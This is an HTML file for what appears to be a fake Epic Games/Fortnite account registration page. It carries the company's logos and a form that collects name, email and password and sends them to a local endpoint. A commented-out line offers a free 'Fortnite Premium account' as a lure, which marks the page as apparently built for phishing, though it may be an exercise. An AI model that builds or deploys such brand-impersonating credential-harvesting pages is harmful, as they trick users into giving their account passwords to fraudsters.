<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <title>Register for an Epic Games account</title>
        <link rel="stylesheet" href="master.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400" rel="stylesheet">
    </head>
    <body>
<!--NAV  -->
        <nav id="mainNav">
            <img class="EpicLogo" src="pics/epic.png" alt="Epic logo">
            <img class="FortNiteLogo" src="pics/fortnait.png" alt="FortNite Logo">
        </nav>
        <main>
            <h1>Create an Account</h1>
            <section class="Main">
                <section class="SignUp">
                    <h2>Sign Up</h2>
                    <!-- <p>Congratulations! You've been awarded exclusive Fortnite Premium account.</p>
                    <p>Please fill in the form to claime the account</p> -->
<!-- FORM -->
                    <form class="" action="/api/user" method="post">
                        <select class="country" name="country">
                            <option value="ET">Estonia</option>
                            <option value="LT">Latvia</option>
                            <option value="LV">Lithuania</option>
                            <option value="BestKorea">North Korea</option>
                        </select><br>
                        <input type="text" name="first" value="" placeholder="*First Name" required>
                        <input type="text" name="last" value="" placeholder="*Last Name" required><br>
                        <input type="text" name="username" value="" placeholder="*Display Name" required><br>
                        <input type="text" name="email" value="" placeholder="*Email" required><br>
                        <input type="password" name="password" value="" placeholder="*Password" required><br>
                        <input type="checkbox" name="newsletter" value="true"><span>I would like to receive latest news and information on this product.</span><br>
                        <input type="checkbox" name="terms" value="true"><span>I have read and agree to the <a href="#">terms of service</a>.</span><br>
                        <button type="submit">Create Account</button>
                    </form>
                </section>
                <!-- <section class="SignIn">
                    <img class="Epic" src="pics/epic.png" alt="">
                    <h2>Already have an account?</h2>
                    <button class="SignInBtn" type="button" name="button">Sign In</button>
                </section> -->

            </section>
        </main>
    </body>
</html>
